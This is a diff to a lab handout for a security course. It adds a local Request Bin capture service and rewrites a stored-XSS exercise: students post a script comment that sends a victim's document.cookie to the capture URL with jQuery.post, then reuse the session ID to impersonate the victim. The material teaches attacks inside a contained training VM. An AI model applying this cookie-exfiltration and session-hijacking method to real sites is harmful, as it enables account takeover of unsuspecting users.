@@ -5,7 +5,7 @@ Preparation
 ___________
 
 Start the Virtual Machine and use your favourite browser to navigate to the
-web application (port 12342) and Usermin (port 12323).
+web application (port 12342), Usermin (port 12323) and Request Bin (port 12344).
 
 After logging in, Usermin will show you the contents of ``/home/student``, from
 which you can access the web application's code in the ``webapp`` folder.
@@ -191,6 +191,26 @@ Ethics and regulations:
     https://ico.org.uk/for-organisations/guide-to-pecr/cookies-and-similar-technologies/.
 
 
+Capturing HTTP requests
+-----------------------
+
+Generally XSS attacks rely on sending the cookies' content to a
+third party web server, under the control of the attacker.
+For the purpose of this practical, a very simple web application is
+running on the VM (port 12344). This web application provides an URL,
+which you can find on the right of the home page, which simply captures
+any HTTP request made to it, and stores the content of the request.
+
+**Visit the Request Bin application (port 12344), get the capture URL from the box**
+**on the right, and visit this URL with your browser. Then refresh the**
+**home page of the Request Bin application and notice the effect.**
+
+You should find a new request, of type "GET", made by your browser when
+trying to open the page. You should be able to see the data associated
+with this request, which includes your IP address, the timestamp,
+and your user-agent string.
+
+
 Using Javascript to steal the session ID
 ----------------------------------------
 
@@ -214,37 +234,45 @@ are in fact the other user: this will cause the website to log you in as the oth
 user.
 
 Javascript code can be used to make HTTP requests in background. These are
-known as AJAX requests. For example, you can use
-Javascript to post a comment to the article with ID 1 (URL ``...&article_id=1``)
+known as AJAX requests. These request can carry arbitrary data, including
+information about the user collected from the vulnerable website.
+
+For example, you can use
+Javascript to send a requesto the Request Bin application,
 by writing in the Console:
 
 .. code:: javascript
 
-  jQuery.post("?page=comment.php",
-              {article_id: 1, body: "My comment."});
+  jQuery.post("<CAPTURE URL>",
+              {a_number: 42, some_text: "Hello World!"});
 
+
+Where ``<CAPTURE URL>`` is the URL from the Request Bin application which
+captures any request made to it.
 
 This method, provided by the jQuery library (included for simplicity),
-makes a HTTP POST request to the URL ``/?page=comment.php`` with payload
-``article_id=1`` and ``body=My comment.``. You can learn more about the
+makes a HTTP POST request to the URL with payload
+``a_number=42`` and ``some_text=Hello World!``. You can learn more about the
 ``jQuery.post`` method at https://api.jquery.com/jquery.post/.
 
-**Write a comment with some Javascript code that as soon as it is read,**
-**will write a comment to another article, containing the cookie information**
-**from the browser of the user.**
+**Write a comment with some Javascript code that**
+**will make HTTP request to the Request Bin capture URL, containing the cookie**
+**information from the browser of the user.**
 
 Hint:
   Try combining the function presented above with the ``document.cookie``
   variable. Don't forget the ``<script></script>`` tags!
 
-**Login with a second user and try visiting the article which has the**
-**malicious comment. Verify that the**
-**user unknowingly commented on the other article, publishing their session ID.**
+**Now login as a second user (the "victim") and try visiting the article**
+**which contains the malicious comment. Verify that the**
+**victim unknowingly sent their cookies the Request Bin application,**
+**including their session ID.**
 
-**Try to impersonate the other user, without using their credentials.**
+**Now log out and use the session ID to impersonate the victim, without**
+**using their credentials.**
 
 Hint:
-  To change your session ID, you will need to edit your own cookies.
+  To change your current session ID, you will need to edit your own cookies.
   Unfortunately, most modern browsers' developer tools allow you only
   to view and delete cookies, but not to edit them. You will need to
   download an extension for your browser in order to edit cookies.
@@ -252,8 +280,3 @@ Hint:
   For example you can use Firebug for Firefox, which is available
   at https://getfirebug.com/downloads/. You can then activate the
   Firebug panel, open the Cookies tab and edit your cookies.
-
-Generally XSS attacks rely on sending the cookies' content to a
-third party web server, under the control of the attacker,
-as opposed to simply publishing the cookies in the same website.
-This is the reason these attacks are known as *Cross-Site*.
